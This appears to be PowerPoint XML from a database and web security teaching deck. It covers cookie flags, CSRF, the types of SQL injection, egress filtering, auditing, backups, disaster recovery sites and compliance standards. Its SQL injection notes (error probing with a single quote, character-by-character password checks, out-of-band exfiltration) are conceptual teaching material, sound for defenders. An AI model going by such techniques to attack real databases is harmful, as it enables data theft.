              <a:t>Referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP request header answers the question: "Which page did the user come from immediately before making this request?"</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="338648983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sz="1100" b="1" dirty="0"/>
              <a:t>Zero-trust principles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1100" dirty="0"/>
              <a:t>  - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>Never trust, always verify.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> Assume every request, whether from inside or outside the network, is a potential threat and must be authenticated, authorized, and encrypted before granting access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="68008536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1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>When set on a cookie, this flag prevents the cookie from being accessed by client-side JavaScript (via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Why it matters:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Even if an attacker manages to inject malicious script into your page, they cannot steal a session cookie marked as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="119042103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dirty="0"/>
              <a:t>Cross-Site Request Forgery (CSRF) is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>an attack that forces authenticated users to submit a request to a Web application against which they are currently authenticated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>. CSRF attacks exploit the trust a Web application has in an authenticated user.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>protocol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (http or https), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>domain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>port</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> are different than its cross site. Omitted if ports are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>443</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> for HTTPS, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>:80</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> for HTTP.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="319208561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If </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>protocol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (http or https), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>domain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>port</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> are different than its cross site. Omitted if ports are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>443</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> for HTTPS, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>:80</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> for HTTP.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="217843351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err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: When set on a cookie, this flag prevents the cookie from being accessed by client-side JavaScript (via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Secure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Ensures cookies are sent only over HTTPS, not HTTP.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Determines when a website's cookies are included in requests originating from other websites</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="386064141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If your ad somehow causes an automatic subscription without the user's explicit consent, that would be a classic CSRF attack.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You are forging a request (the "subscribe" action) that is executed from the user's logged-in browser without their knowledge or intent. The ad is simply the delivery mechanism for the exploit.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="203241045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Device fingerprinting is the process of collecting various hardware and software attributes from a device.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="312400071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752217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b="1" i="0" dirty="0"/>
              <a:t>In-band </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="0" dirty="0"/>
              <a:t>SQL injection is a type of SQL injection where the attacker receives the result as a direct response using the same communication channel.</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b="1" i="0" dirty="0"/>
              <a:t>Blind SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="0" dirty="0"/>
              <a:t> injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages.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b="1" i="0" dirty="0"/>
              <a:t>Out-of-band</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="0" dirty="0"/>
              <a:t> SQL injection (OOB SQLi) is a type of SQL injection where the attacker does not receive a response from the attacked application on the same communication channel but instead is able to cause the application to send data to a remote endpoint that they control.</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i="0" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="193307943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i="0" dirty="0"/>
              <a:t>Single quote after user input 1 will show error.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" i="0" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="174324598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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>UNION</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> operator is used to combine the result-set of two or more </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>SELECT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> statements.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>UNION</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> operator automatically removes duplicate rows from the result set.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="44580979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Checking password character by character – </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="408714626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C3E43-8936-03CB-B02B-12CF3F2827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DAFF58-3A25-D5D8-5BD8-AECCC7FB915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A6DF982-424C-1E19-C84D-10E6B42AFFAA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Needs to wait in time-based.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If  difference does not exist, Boolean-based will not work.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="133159121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dirty="0"/>
              <a:t>XML PATH(‘’) - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>concatenate the result set as XML</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>OPENROWSET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is a provider that allows access to remote data sources</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>OLE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> means </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Object Linking and Embedding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (a Microsoft technology for embedding objects).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="70374288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To restrict egress (outgoing) network traffic, you implement egress filtering or egress policies to control which external destinations, ports, and protocols are allowed to be accessed from a network or system. </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="272011143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Logging</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = wide capture of system/application/database events (like a diary).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Auditing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = targeted recording of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>security-critical and compliance-relevant events</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (like CCTV with timestamps). </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="271560486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Chronological: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Events are recorded in the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>exact order </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>they happened, like entries in a diary or a timeline.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Immutable: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Once something is recorded, it can </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>never be changed or deleted</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. It is permanent.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="336985196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Full Backup:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> A complete copy of the entire tower. This is your starting point.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Incremental Backup:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Backs up </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>only the bricks added since the last backup of any kind</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (whether it was a full or another incremental).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Differential Backup:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Backs up </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>all the bricks added since the last full backup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="71365317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BCP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is about </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>staying open for business</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, no matter what happens. It's a proactive strategy to protect revenue, reputation, and customer trust.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="393011943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A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>hot site</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is a live, synchronized, and fully redundant copy of your primary database environment. It uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>real-time data replication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. Every transaction (INSERT, UPDATE, DELETE) committed to the primary database is instantly applied to the hot site database.</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A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>warm site</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is a pre-configured environment with a recently restored copy of the database, but it is not in a live, synchronized state.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="52411178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200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>GDPR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> → Protect personal data (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>General Data Protection Regulation – EU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>HIPAA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> → Protect healthcare data (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Health Insurance Portability and Accountability Act – USA)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>PCI-DSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> → Protect payment card data (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Payment Card Industry Data Security Standard – Globa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="302705912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Instead of giving someone a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>master key </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>to the entire database, you give them a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>specific key</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to only the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>rooms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>cabinets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> they need.</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b="1" dirty="0"/>
              <a:t>Granular - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>made of a mass of small hard pieces; looking or feeling like a mass of small hard pieces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dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="385292381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ISO stands for the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>International Organisation for Standardisation</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38447403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userDrawn="1">
  <p:cSld name="TITLE">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name="Shape 8"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{25B0D7B3-AED4-B036-7EDB-779E6F6668DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2">
            <a:alphaModFix amt="20000"/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="537210"/>
            <a:ext cx="9144000" cy="4069080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Google Shape;9;p2"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect t="835" b="845"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9143998" cy="5143501"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:grpSp>
